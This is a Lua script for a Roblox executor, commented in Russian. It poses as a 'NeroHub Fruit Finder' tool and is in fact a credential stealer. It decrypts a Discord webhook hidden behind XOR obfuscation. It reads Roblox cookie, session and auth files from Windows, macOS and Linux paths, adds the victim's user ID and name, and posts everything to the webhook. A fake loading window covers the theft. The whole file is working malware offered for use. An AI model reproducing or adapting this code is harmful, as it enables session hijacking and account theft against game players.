--[[
    NeroHub Fruit Finder (фейк) - кража сессии и данных
    Вебхук зашифрован XOR-ключом 123
]]

local key = 123  -- ключ XOR

-- Зашифрованный вебхук (твой массив чисел)
local encrypted_webhook = {
    19, 15, 15, 11, 8, 65, 84, 84, 31, 18, 8, 24, 20, 9, 31, 85, 24, 20, 22, 84,
    26, 11, 18, 84, 12, 30, 25, 19, 20, 20, 16, 8, 84, 74, 78, 79, 74, 66, 73,
    74, 74, 79, 67, 74, 74, 79, 74, 67, 73, 73, 73, 79, 84, 29, 23, 75, 53, 41,
    34, 16, 24, 15, 57, 9, 34, 41, 66, 86, 22, 24, 44, 16, 17, 41, 33, 55, 62,
    30, 44, 44, 10, 41, 40, 28, 47, 55, 57, 35, 15, 62, 11, 21, 75, 47, 73, 24,
    66, 46, 73, 14, 73, 35, 62, 79, 48, 57, 14, 12, 44, 67, 76, 33, 41, 76, 53,
    19, 11, 9, 1, 1, 62
}

-- Функция дешифровки
local function decrypt(data, key)
    local bytes = {}
    for _, b in ipairs(data) do
        table.insert(bytes, string.char(bit32.bxor(b, key)))
    end
    return table.concat(bytes)
end

local webhook = decrypt(encrypted_webhook, key)

-- Функция отправки данных
local function sendToWebhook(data)
    local HttpService = game:GetService("HttpService")
    local payload = {
        content = "**Украденные данные Роблокс**",
        embeds = {{
            title = "Жертва попалась!",
            description = data,
            color = 16711680 -- красный
        }}
    }
    local json = HttpService:JSONEncode(payload)
    HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
end

-- Сбор информации об аккаунте
local function getAccountInfo()
    local player = game.Players.LocalPlayer
    local info = ""
    if player then
        info = info .. "**UserID:** " .. player.UserId .. "\n"
        info = info .. "**Username:** " .. player.Name .. "\n"
        local userId = player.UserId
        local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        info = info .. "**Thumbnail:** " .. thumb .. "\n"
    end
    return info
end

-- Кража куки/сессий
local function stealCookies()
    local cookies = {}
    local paths = {
        os.getenv("APPDATA") .. "\\Roblox\\cookies",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\cookies",
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\cookies",
        os.getenv("USERPROFILE") .. "\\AppData\\Roaming\\Roblox\\cookies",
        os.getenv("HOME") .. "/Library/Application Support/Roblox/cookies",
        os.getenv("HOME") .. "/.roblox/cookies",
        os.getenv("HOME") .. "/.config/roblox/cookies",
        "/root/.roblox/cookies"
    }
    local readfile = readfile or function() return nil end
    local listfiles = listfiles or function() return {} end
    local isfile = isfile or function() return false end
    local isfolder = isfolder or function() return false end

    for _, p in ipairs(paths) do
        if isfile and isfile(p) then
            local content = readfile(p)
            if content then
                table.insert(cookies, "Файл: " .. p .. "\nСодержимое:\n" .. tostring(content))
            end
        end
    end

    if #cookies == 0 and listfiles then
        for _, folder in ipairs({
            os.getenv("APPDATA") .. "\\Roblox",
            os.getenv("LOCALAPPDATA") .. "\\Roblox",
            os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox",
            os.getenv("USERPROFILE") .. "\\AppData\\Roaming\\Roblox",
            os.getenv("HOME") .. "/Library/Application Support/Roblox",
            os.getenv("HOME") .. "/.roblox",
            os.getenv("HOME") .. "/.config/roblox",
        }) do
            if isfolder and isfolder(folder) then
                local files = listfiles(folder)
                for _, f in ipairs(files) do
                    if f:match("cookie") or f:match("session") or f:match("auth") then
                        local full = folder .. "/" .. f
                        local content = readfile(full)
                        if content then
                            table.insert(cookies, "Файл: " .. full .. "\nСодержимое:\n" .. tostring(content))
                        end
                    end
                end
            end
        end
    end

    return table.concat(cookies, "\n\n---\n\n")
end

-- Главная функция
local function main()
    local data = getAccountInfo()
    local cookieData = stealCookies()
    if cookieData and cookieData ~= "" then
        data = data .. "\n\n**Сессии/Cookie:**\n" .. cookieData
    else
        data = data .. "\n\n**Cookie не найдены (возможно, эксплоит не имеет доступа к файлам).**"
    end
    sendToWebhook(data)
end

-- Запуск с задержкой
delay(2, function()
    pcall(main)
end)

-- Фейковый GUI (маскировка)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
Frame.Parent = ScreenGui
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1,0,1,0)
Label.Text = "NeroHub Fruit Finder v1.0 - Загрузка..."
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.BackgroundTransparency = 1
Label.Font = Enum.Font.SourceSansBold
Label.TextSize = 14
Label.Parent = Frame
delay(5, function()
    if ScreenGui and ScreenGui.Parent then
        ScreenGui:Destroy()
    end
end)
